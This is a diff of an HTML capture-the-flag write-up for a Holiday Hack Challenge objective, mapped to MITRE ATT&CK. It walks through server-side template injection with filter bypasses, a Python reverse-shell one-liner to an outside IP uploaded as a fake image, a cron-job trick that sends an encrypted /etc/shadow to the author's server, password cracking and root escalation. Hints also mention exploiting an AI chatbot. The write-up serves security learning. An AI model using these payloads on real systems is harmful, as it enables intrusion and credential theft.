@@ -18,14 +18,12 @@ nav: |
 <thead>
 <tr>
 <th>Objective: Snowblind Ambush</th>
-<br>
 <th>Difficulty Level: 5</th>
 </tr>
 </thead>
 <tbody>
 <tr>
 <td>Head to the Hotel to stop Frosty's plan. Torkel is waiting at the Grand Web Terminal.</td>
-<br>
 <td>Location: Grand Hotel</td>
 </tr>
 </tbody>
@@ -39,76 +37,52 @@ Starting with only public access to the web application, reconnaisance was condu
 <thead>
 <tr>
 <th>Activity</th>
-<br>
 <th>Primary Tactic</th>
-<br>
 <th>MITRE ATT&CK Technique ID</th>
-<br>
 <th>MITRE ATT&CK Technique Name</th>
 </tr>
 </thead>
 <tbody>
 <tr>
 <td>Gain Access to web application: Leak Sensitive Information</td>
-<br>
 <td>Reconnaissance</td>
-<br>
 <td>T1589</td>
-<br>
 <td>Gather Victim Identity Information</td>
 </tr>
 <tr>
 <td>Explore SSTI and achieve RCE: Insecure Software</td>
-<br>
 <td>Execution</td>
-<br>
 <td>T1190</td>
-<br>
 <td>Exploit Public-Facing Application</td>
 </tr>
 <tr>
 <td>Achieve Shell Access: Insecure File Upload	Resource</td>
-<br>
 <td>Development</td>
-<br>
 <td>T1608.001</td>
-<br>
 <td>Upload Malware</td>
 </tr>
 <tr>
 <td>Exfiltrate Data</td>
-<br>
 <td>Exfiltration</td>
-<br>
 <td>T1041</td>
-<br>
 <td>Exfiltration Over C2 Channel</td>
 </tr>
 <tr>
 <td>Decode PNG file</td>
-<br>
 <td>Defense Evasion</td>
-<br>
 <td>T1140</td>
-<br>
 <td>Deobfuscate/Decode Files or Information</td>
 </tr>
 <tr>
 <td>Crack hashed password for Root</td>
-<br>
 <td>Credential Access</td>
-<br>
 <td>T1110.002</td>
-<br>
 <td>Password Cracking</td>
 </tr>
 <tr>
 <td>Escalate Privileges</td>
-<br>
 <td>Privilege Escalation</td>
-<br>
 <td>T1548</td>
-<br>
 <td>Abuse Elevation Control Mechanism</td>
 </tr>
 </tbody>
@@ -173,99 +147,52 @@ A basic test to see if SSTI is possible is {{7*7}}. Because the application eval
 Trial and error testing revealed the following filters and the obfuscations needed to bypass.
 <br>
 <pre><code class="language-">
-<br>
 ┌───────────────────────────────┐
-<br>
 │ 1. Payload Construction        │
-<br>
 │   - Bracket access             │
-<br>
 │   - Escaped underscores (\u005f, \137)
-<br>
 │   - Reversed strings ('ssalc'|reverse) │
-<br>
 └───────────────┬───────────────┘
-<br>
                 │
-<br>
                 ▼
-<br>
 ┌───────────────────────────────┐
-<br>
 │ 2. WAF Bypass                 │
-<br>
 │   - Literal "_" stripped       │
-<br>
 │   - Escapes reconstruct "_"    │
-<br>
 │   - Reverse evades keyword ban │
-<br>
 └───────────────┬───────────────┘
-<br>
                 │
-<br>
                 ▼
-<br>
 ┌───────────────────────────────┐
-<br>
 │ 3. Dunder Reconstruction      │
-<br>
 │   - __class__ rebuilt          │
-<br>
 │   - __mro__ rebuilt            │
-<br>
 └───────────────┬───────────────┘
-<br>
                 │
-<br>
                 ▼
-<br>
 ┌───────────────────────────────┐
-<br>
 │ 4. Traversal into Internals   │
-<br>
 │   - attr('__subclasses__')()  │
-<br>
 │   - Returns real class list    │
-<br>
 └───────────────┬───────────────┘
-<br>
                 │
-<br>
                 ▼
-<br>
 ┌───────────────────────────────┐
-<br>
 │ 5. Subclass Enumeration       │
-<br>
 │   - collections.OrderedDict    │
-<br>
 │   - enum._EnumDict             │
-<br>
 │   - werkzeug.datastructures... │
-<br>
 │   - flask.config.Config        │
-<br>
 │   ...                          │
-<br>
 └───────────────┬───────────────┘
-<br>
                 │
-<br>
                 ▼
-<br>
 ┌───────────────────────────────┐
-<br>
 │ 6. Patched Routes             │
-<br>
 │   - object.__subclasses__() → 500
-<br>
 │   - mro()[0].__subclasses__() → 500
-<br>
 │   → Sandbox hardening present  │
-<br>
 └───────────────────────────────┘
-<br>
 </code></pre>
 <br>
 A script was used to enumerate the indexes and evaluate if RCE is possible. The initial command used was a simple 'whoami".
@@ -283,19 +210,14 @@ The following indexes where discovered that would allow RCE:
 The following payload was inserted into a file called payload.jpg and uploaded to the admin profile.
 
 <pre><code class="language-">
-<br>
 #!/bin/sh
-<br>
 export RHOST="45.79.190.29";export RPORT=4444;python -c 'import socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'
-<br>
 </code></pre>
 
 Selecting index 205 with get > os > popen.read() as our target, the following command was executed, resulting in a shell running in the www-data context.
 
 <pre><code class="language-">
-<br>
 sh /app/static/images/admin\\u005ff1f9cc53781abb79\\u002epng
-<br>
 </code></pre>
 
 <h2>Step Four: Exfilitrate Data leveraging an Insecure processes / Data Leakage</h2>
@@ -307,9 +229,7 @@ With initial access established, time for more recon. An interesting cron job wa
 The script does the following:
 <ul>
 <li>it looks for a file in /dev/shm with a name formatted according to this pattern: '\\.frosty[0-9]+$'</li>
-<br>
 <li>it reads the file and applies a regular expression that requires at least the final two characters of the url to be letters and not numbers</li>
-<br>
 <li>if the regular experssion is true, it encrypts a copy of /etc/shadow and posts it to the url</li>
 </ul>
 
@@ -322,9 +242,7 @@ An HTTP server was started on an external facing linux server on port 8000 to re
 The following command was issued in the shell as www-data to trigger the data exfiltration. The file was created, and moments later it was deposited on my web server.
 
 <pre><code class="language-">
-<br>
 echo "http://45-79-190-29.ip.linodeusercontent.com:8000/exfil" > /dev/shm/.frosty999
-<br>
 </code></pre>
 
 The exfiltrated data file is located here: <a href="/HHC_2025/resources/shadow_exfil.png">Exfiltrated File</a>
@@ -363,34 +281,28 @@ With root password, it is a simple matter to escalate privileges using the su co
 <thead>
 <tr>
 <th>Tools Used</th>
-<br>
 <th>Tool Version</th>
 </tr>
 </thead>
 <tbody>
 <tr>
 <td>John the Ripper</td>
-<br>
 <td>1.9.0-jumbo-1+bleeding-aec1328d6c</td>
 </tr>
 <tr>
 <td>Linux Linode</td>
-<br>
 <td>System	Ubuntu 24.04 LTS</td>
 </tr>
 <tr>
 <td>netcat</td>
-<br>
 <td>v1.10-50</td>
 </tr>
 <tr>
 <td>Edge Developer Tools</td>
-<br>
 <td>Version 142.0.3595.94</td>
 </tr>
 <tr>
 <td>Burp Suite Community Edition</td>
-<br>
 <td>v2024.11.2</td>
 </tr>
 </tbody>
@@ -401,24 +313,20 @@ With root password, it is a simple matter to escalate privileges using the su co
 <thead>
 <tr>
 <th>Provided By</th>
-<br>
 <th>Hint</th>
 </tr>
 </thead>
 <tbody>
 <tr>
 <td>Santa</td>
-<br>
 <td>Codes: If you can't get your payload to work, perhaps you are missing some form of obfuscation? A computer can understand many languages and formats, find one that works! Don't give up until you have tried at least eight different ones, if not, then it's truely hopeless.</td>
 </tr>
 <tr>
 <td>Santa</td>
-<br>
 <td>Overtly Helpful?: I think admin is having trouble, remembering his password. I wonder how he is retaining access, I'm sure someone or something is helping him remembering. Ask around!</td>
 </tr>
 <tr>
 <td>Torkel</td>
-<br>
 <td>I've been studying this web application that controls part of Frosty's infrastructure. There's a Flask backend with an AI chatbot that seems to have access to sensitive system information. Think of this as finding a way up the skorstein into Frosty's system - we need to exploit this chatbot to gain access and ultimately stop Frosty from freezing everything. Can you help me get through these defenses?</td>
 </tr>
 </tbody>
@@ -428,19 +336,16 @@ With root password, it is a simple matter to escalate privileges using the su co
 <thead>
 <tr>
 <th>Provided By</th>
-<br>
 <th>Notes</th>
 </tr>
 </thead>
 <tbody>
 <tr>
 <td>Fluffme</td>
-<br>
 <td>My initial "shell" was more of a SSTI command pipeline. This was not the right approach.</td>
 </tr>
 <tr>
 <td>Khesperus</td>
-<br>
 <td>Sanity checks on achieving shell and on decrypting the png file.</td>
 </tr>
 </tbody>
